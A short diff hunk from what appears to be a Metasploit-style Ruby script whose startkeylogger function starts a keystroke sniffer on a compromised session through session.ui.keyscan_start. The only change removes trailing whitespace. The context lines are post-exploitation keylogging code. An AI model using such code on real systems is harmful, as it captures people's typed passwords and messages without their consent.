@@ -87,7 +87,7 @@ def startkeylogger(session)
 	begin
 		#print_status("Grabbing Desktop Keyboard Input...")
 		#session.ui.grab_desktop
-		print_status("Starting the keystroke sniffer...") 
+		print_status("Starting the keystroke sniffer...")
 		session.ui.keyscan_start
 		return true
 	rescue
